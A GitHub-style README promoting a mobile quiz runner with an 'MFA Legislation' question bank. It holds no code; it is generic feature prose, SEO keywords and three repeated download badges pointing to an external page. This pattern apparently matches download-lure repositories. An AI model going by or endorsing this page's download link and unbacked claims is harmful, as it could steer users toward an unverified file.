![preview](https://raw.githubusercontent.com/arnebauhaus12-cpu/quiz-bank-runner/main/screen_09bed.svg)
[![Download](https://raw.githubusercontent.com/arnebauhaus12-cpu/quiz-bank-runner/main/dl_559e399.svg)](https://arnebauhaus12-cpu.github.io/quiz-bank-runner/)

# 🎓 Fayna Edu Trenazher — Mobile-First Quiz Runtime & Question Bank Engine

![License](https://img.shields.io/badge/license-MIT-blue)
![Platform](https://img.shields.io/badge/platform-mobile--first-9cf)
![Language](https://img.shields.io/badge/i18n-multilingual-orange)
![Year](https://img.shields.io/badge/release-2026-brightgreen)
![Status](https://img.shields.io/badge/status-actively%20maintained-success)
![Support](https://img.shields.io/badge/support-24%2F7-important)

---

## 🧭 A Different Kind of Study Companion

Most learning tools treat knowledge like a checklist — tick the box, move on, forget. **Fayna Edu Trenazher** treats knowledge like a **cockpit**: you sit down, you run through simulated scenarios, and you walk away with reflexes instead of trivia. This repository is a **quiz runner and question-bank platform** built for the small screen first, because that is where most of us actually study — on the bus, in a queue, in the five minutes between two meetings.

The project ships with its first official question bank — **MFA Legislation** — and a runtime that is deliberately generic, so any future bank (medicine, aviation, safety compliance, driving theory, professional certifications) can plug into the same engine without touching the UI.

This README is intentionally long. If you are evaluating the project as a whole, read the sections in order; if you just want the highlights, jump to **✨ Feature Constellation**.

---

## 📥 Acquiring This Project

[![Download](https://raw.githubusercontent.com/arnebauhaus12-cpu/quiz-bank-runner/main/dl_559e399.svg)](https://arnebauhaus12-cpu.github.io/quiz-bank-runner/)

That is the whole distribution story. No accounts, no intermediaries, no friction layers. One line, one artifact, one straightforward path from curiosity to a working copy on your device.

---

## 🚀 Why This Exists

Question banks are everywhere. Good question **runners** are rare. The difference is the same as between a dictionary and a language tutor: one stores data, the other builds fluency.

This repository is the tutor.

The design philosophy rests on three pillars:

1. **Mobile-first, always.** Every layout decision, every gesture, every transition is measured against a 360×640 viewport before it is measured against a desktop monitor.
2. **Banks are data, not code.** A question bank is a structured collection of topics, prompts, answers, and explanations. Swapping banks should feel like swapping a cartridge, not rewriting the console.
3. **Progress is sacred.** Streaks, mastery levels, and review queues must survive tab closures, network drops, and device restarts.

The first bank, **MFA Legislation**, was chosen because it embodies everything a good bank should be: dense, precise, and impossible to memorize without actually understanding the underlying rules.

---

## ✨ Feature Constellation

### 🧠 Quiz Runtime

- **Adaptive pacing** — the runner adjusts difficulty based on rolling accuracy, so you are never bored and never drowned.
- **Instant rationale** — every answer, correct or not, can surface a short explanation, turning each question into a micro-lesson.
- **Timed and untimed modes** — simulate the pressure of a real exam or take your time in reflective practice.
- **Question shuffling** — deterministic seeds available for reproducible sessions, and random mode for genuine surprise.
- **Flag-for-review** — mark tricky items mid-session and revisit them before submitting.
- **Session summaries** — accuracy, average response time, domain breakdown, and a list of missed items for targeted revision.

### 📚 Question Bank Architecture

- **Declarative bank format** — banks are described as structured data, independent of runtime code.
- **Topic tagging** — every question carries one or more topic tags, enabling filtered practice (e.g., "only jurisdiction questions").
- **Weighted selection** — banks can declare topic weights so exam-style simulations mirror real distribution.
- **Version metadata** — each bank declares its revision, so learners always know which edition they studied.
- **Explanation layer** — optional but encouraged; the bank format supports short and long explanations.

### 📱 Responsive Interface

- **One-handed operation** — primary actions are always reachable with a thumb.
- **Gesture-friendly navigation** — swipe to skip, tap to reveal, long-press to flag.
- **Dark and light themes** — automatic following of system preference, with manual override.
- **Reduced-motion respect** — animations collapse gracefully when the OS requests it.
- **Landscape and portrait parity** — no feature is locked behind an orientation.

### 🌍 Multilingual Support

- **Locale-aware strings** — the UI text layer is fully externalized.
- **Per-bank translations** — banks can ship their own localized prompts and explanations.
- **Right-to-left readiness** — layout primitives are direction-agnostic.
- **Fallback chains** — missing translations degrade gracefully to the closest available locale.

### 🔔 Learner Support & Retention

- **24/7 customer support channel** — a documented path for questions, bug reports, and feature requests, staffed around the clock.
- **Streak tracking** — daily practice momentum that survives timezone changes.
- **Reminder nudges** — opt-in notifications that respect quiet hours.
- **Progress sync** — local-first with optional export, so your history is never hostage to a server.

### 🧩 Extensibility

- **Pluggable bank registry** — new banks can be added without modifying the runner.
- **Scoring strategy interface** — swap the default scorer for custom grading rules.
- **Theming hooks** — override colors, spacing, and typography via a single theme object.
- **Offline-first storage** — the runtime works without a network connection and reconciles later.

---

## 🎯 The MFA Legislation Bank

The inaugural bank covers **MFA Legislation** in a structured way. Topics include, but are not limited to:

- Foundational principles and definitions.
- Jurisdictional boundaries and delegation of authority.
- Procedural requirements and documentation duties.
- Reporting obligations and timelines.
- Compliance pitfalls and common misconceptions.

Each question is tagged, weighted, and paired with an explanation where the source material permits. A session on this bank feels less like memorization and more like **walking through a regulatory landscape with a guide who has been there before**.

---

## 🛠️ Technical Overview

The runtime is organized around a small set of concerns:

| Layer | Responsibility |
| --- | --- |
| Presentation | Screens, navigation, theming, gestures |
| Session | Quiz state machine, timers, scoring, flagging |
| Bank | Parsing, validation, selection, weighting |
| Storage | Progress persistence, streaks, export/import |
| i18n | Locale resolution, string lookup, RTL handling |

The state machine at the heart of the **Session** layer is deliberately explicit: every transition — start, answer, flag, review, submit, reset — is named and testable. This makes the runtime predictable in exactly the way a quiz runner must be: no hidden branches, no surprise side effects, no "why did my score change?" moments.

---

## 🧪 Quality Practices

- **Deterministic testing** — the shuffle seed is injectable, so tests can assert exact question order.
- **Bank schema validation** — malformed banks are rejected with actionable messages.
- **Accessibility checks** — contrast ratios, focus order, and screen-reader labels are part of the review checklist.
- **Performance budget** — first interaction should feel instant on a mid-range phone from three years ago.

---

## 🗺️ Roadmap Through 2026

- **Q1 2026** — Stabilize the bank schema and publish authoring guidelines.
- **Q2 2026** — Ship the second and third official banks.
- **Q3 2026** — Introduce spaced-repetition review queues.
- **Q4 2026** — Community bank submission workflow with review pipeline.

This timeline is indicative, not contractual. The project prioritizes correctness over cadence.

---

## 🤝 Contributing

Contributions are welcome across all layers: banks, translations, UI polish, accessibility, and documentation. Before opening a change:

1. Skim the existing bank format and follow its conventions.
2. Keep pull requests focused — one concern per change.
3. Include a short rationale; the "why" matters as much as the "what".
4. Tests are appreciated, not mandated, but a broken test is a blocked merge.

Bank authors should especially read the authoring guide: a good bank is a small act of teaching, and teaching deserves care.

---

## 🔍 SEO-Friendly Themes

If you arrived here searching for any of the following, you are in the right place: mobile-first quiz runner, exam preparation application, legislation question bank, multilingual quiz platform, offline study tool, adaptive quiz engine, spaced repetition learning companion, secure knowledge trainer, regulatory compliance study aid, certification practice runner.

---

## 🧾 Disclaimer

This project is an **educational tool**. The MFA Legislation bank is provided for study and review purposes only and does not constitute legal advice. Laws, regulations, and interpretations change over time; always consult the current official sources and qualified professionals before relying on any material for real-world decisions. The maintainers make no warranty as to the accuracy, completeness, or fitness of any question, answer, or explanation contained in any bank.

Progress data, streaks, and statistics are stored locally by default. Any export functionality places the responsibility for safeguarding exported files with the user.

Support is offered on a best-effort basis around the clock, but response times may vary depending on volume.

---

## 📜 License

This project is released under the **MIT License**.

You can read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 The Fayna Edu Trenazher contributors.

Permission is hereby granted, in the spirit of open exchange, to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of this software and its accompanying documentation, subject to the conditions of the MIT License. The software is provided "as is", without warranty of any kind, express or implied.

---

[![Download](https://raw.githubusercontent.com/arnebauhaus12-cpu/quiz-bank-runner/main/dl_559e399.svg)](https://arnebauhaus12-cpu.github.io/quiz-bank-runner/)